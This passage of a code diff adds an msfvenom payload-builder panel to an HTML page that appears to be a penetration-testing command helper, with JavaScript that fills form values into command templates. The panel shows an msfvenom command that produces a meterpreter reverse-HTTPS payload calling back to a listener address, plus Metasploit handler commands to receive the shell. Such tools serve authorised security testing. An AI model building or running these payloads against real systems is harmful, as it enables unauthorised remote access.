+                    <option value="war">war</option>
+                </select><br>
+                Output File：&nbsp;&nbsp;
+                <input type="text" id="msfbuilderinputText9" oninput="msfbuilderdisplayText()" style="height: 50px;width: 300px;"
+                    value="test.asp">
+            </div>
+
+            <div style="background-color: black; height: 100px;overflow-y: auto;">
+                <span style="color: white;">
+                    <p>MSF Venom Command：</p>
+                    <p>msfvenom -p <span id="msfbuilderdisplayText">linux/aarch64/meterpreter_reverse_https</span> LHOST=<span id="msfbuilderdisplayText1">192.168.1.1</span> LPORT=<span id="msfbuilderdisplayText2">1234</span> --platform <span id="msfbuilderdisplayText5">aix</span> -a <span id="msfbuilderdisplayText6">x64</span> -n <span id="msfbuilderdisplayText7">x64</span> -e <span id="msfbuilderdisplayText3">cmd/echo</span> -i <span id="msfbuilderdisplayText4">1234</span> -f <span id="msfbuilderdisplayText8">asp</span> -o <span id="msfbuilderdisplayText9">test.asp</span></p>
+                </span>
+            </div>
+            <div style="background-color:cadetblue; height: 250px;overflow-y: auto;">
+                <span style="color: white;">
+                    <p>Load Handler Only：</p>
+                    <p>use exploit/multi/handler</p>
+                    <p>set PAYLOAD <span id="msfbuilderdisplayText10">aix/ppc/shell_bind_tcp</span></p>
+                    <p>set LHOST <span id="msfbuilderdisplayText11">192.168.1.1</span></p>
+                    <p>set LPORT <span id="msfbuilderdisplayText12">1234</span></p>
+                    <p>run</p>
+                </span>
+
+            </div>
+
+        </div>
+
+
     </div>
 
     <script>
@@ -1024,6 +1789,130 @@
             displayElement33.textContent = githubinputText.value;
             displayElement34.textContent = githubinputText.value;
         }
+
+        // 文件传输
+        function msfdisplayText() {
+            // 获取输入框的值
+            var inputElement = document.getElementById('msfinputText');
+            var inputElement1 = document.getElementById('msfinputText1');
+
+
+            var displayElement = document.getElementById('msfdisplayText');
+            var displayElement1 = document.getElementById('msfdisplayText1');
+            var displayElement2 = document.getElementById('msfdisplayText2');
+            var displayElement3 = document.getElementById('msfdisplayText3');
+            var displayElement4 = document.getElementById('msfdisplayText4');
+            var displayElement5 = document.getElementById('msfdisplayText5');
+            var displayElement6 = document.getElementById('msfdisplayText6');
+            var displayElement7 = document.getElementById('msfdisplayText7');
+            var displayElement8 = document.getElementById('msfdisplayText8');
+            var displayElement9 = document.getElementById('msfdisplayText9');
+            var displayElement10 = document.getElementById('msfdisplayText10');
+            var displayElement11 = document.getElementById('msfdisplayText11');
+            var displayElement12 = document.getElementById('msfdisplayText12');
+            var displayElement13 = document.getElementById('msfdisplayText13');
+            var displayElement14 = document.getElementById('msfdisplayText14');
+            var displayElement15 = document.getElementById('msfdisplayText15');
+            var displayElement16 = document.getElementById('msfdisplayText16');
+            var displayElement17 = document.getElementById('msfdisplayText17');
+            var displayElement18 = document.getElementById('msfdisplayText18');
+            var displayElement19 = document.getElementById('msfdisplayText19');
+            var displayElement20 = document.getElementById('msfdisplayText20');
+            var displayElement21 = document.getElementById('msfdisplayText21');
+            var displayElement22 = document.getElementById('msfdisplayText22');
+            var displayElement23 = document.getElementById('msfdisplayText23');
+            var displayElement24 = document.getElementById('msfdisplayText24');
+            var displayElement25 = document.getElementById('msfdisplayText25');
+            var displayElement26 = document.getElementById('msfdisplayText26');
+            var displayElement27 = document.getElementById('msfdisplayText27');
+            var displayElement28 = document.getElementById('msfdisplayText28');
+            var displayElement29 = document.getElementById('msfdisplayText29');
+            var displayElement30 = document.getElementById('msfdisplayText30');
+            var displayElement31 = document.getElementById('msfdisplayText31');
+            var displayElement32 = document.getElementById('msfdisplayText32');
+            var displayElement33 = document.getElementById('msfdisplayText33');
+
+            displayElement.textContent = inputElement.value;
+            displayElement1.textContent = inputElement1.value;
+            displayElement2.textContent = inputElement.value;
+            displayElement3.textContent = inputElement1.value;
+            displayElement4.textContent = inputElement.value;
+            displayElement5.textContent = inputElement1.value;
+            displayElement6.textContent = inputElement.value;
+            displayElement7.textContent = inputElement1.value;
+            displayElement8.textContent = inputElement.value;
+            displayElement9.textContent = inputElement1.value;
+            displayElement10.textContent = inputElement.value;
+            displayElement11.textContent = inputElement1.value;
+            displayElement12.textContent = inputElement.value;
+            displayElement13.textContent = inputElement1.value;
+            displayElement14.textContent = inputElement.value;
+            displayElement15.textContent = inputElement1.value;
+            displayElement16.textContent = inputElement.value;
+            displayElement17.textContent = inputElement1.value;
+            displayElement18.textContent = inputElement.value;
+            displayElement19.textContent = inputElement1.value;
+            displayElement20.textContent = inputElement.value;
+            displayElement21.textContent = inputElement1.value;
+            displayElement22.textContent = inputElement.value;
+            displayElement23.textContent = inputElement1.value;
+            displayElement24.textContent = inputElement.value;
+            displayElement25.textContent = inputElement1.value;
+            displayElement26.textContent = inputElement.value;
+            displayElement27.textContent = inputElement1.value;
+            displayElement28.textContent = inputElement.value;
+            displayElement29.textContent = inputElement1.value;
+            displayElement30.textContent = inputElement.value;
+            displayElement31.textContent = inputElement1.value;
+            displayElement32.textContent = inputElement.value;
+            displayElement33.textContent = inputElement1.value;
+
+
+        }
+
+        // msfbuilder
+        function msfbuilderdisplayText(){
+            var inputElement = document.getElementById('msfbuilderinputText');
+            var inputElement1 = document.getElementById('msfbuilderinputText1');
+            var inputElement2 = document.getElementById('msfbuilderinputText2');
+            var inputElement3 = document.getElementById('msfbuilderinputText3');
+            var inputElement4 = document.getElementById('msfbuilderinputText4');
+            var inputElement5 = document.getElementById('msfbuilderinputText5');
+            var inputElement6 = document.getElementById('msfbuilderinputText6');
+            var inputElement7 = document.getElementById('msfbuilderinputText7');
+            var inputElement8 = document.getElementById('msfbuilderinputText8');
+            var inputElement9 = document.getElementById('msfbuilderinputText9');
+
+            var displayElement = document.getElementById('msfbuilderdisplayText');
+            var displayElement1 = document.getElementById('msfbuilderdisplayText1');
+            var displayElement2 = document.getElementById('msfbuilderdisplayText2');
+            var displayElement3 = document.getElementById('msfbuilderdisplayText3');
+            var displayElement4 = document.getElementById('msfbuilderdisplayText4');
+            var displayElement5 = document.getElementById('msfbuilderdisplayText5');
+            var displayElement6 = document.getElementById('msfbuilderdisplayText6');
+            var displayElement7 = document.getElementById('msfbuilderdisplayText7');
+            var displayElement8 = document.getElementById('msfbuilderdisplayText8');
+            var displayElement9 = document.getElementById('msfbuilderdisplayText9');
+            var displayElement10 = document.getElementById('msfbuilderdisplayText10');
+            var displayElement11 = document.getElementById('msfbuilderdisplayText11');
+            var displayElement12 = document.getElementById('msfbuilderdisplayText12');
+
+
+            displayElement.textContent = inputElement.value;
+            displayElement1.textContent = inputElement1.value;
+            displayElement2.textContent = inputElement2.value;
+            displayElement3.textContent = inputElement3.value;
+            displayElement4.textContent = inputElement4.value;
+            displayElement5.textContent = inputElement5.value;
+            displayElement6.textContent = inputElement6.value;
+            displayElement7.textContent = inputElement7.value;
+            displayElement8.textContent = inputElement8.value;
+            displayElement9.textContent = inputElement9.value;
+            displayElement10.textContent = inputElement.value;
+            displayElement11.textContent = inputElement1.value;
+            displayElement12.textContent = inputElement2.value;
+        }
+
 
     </script>
 
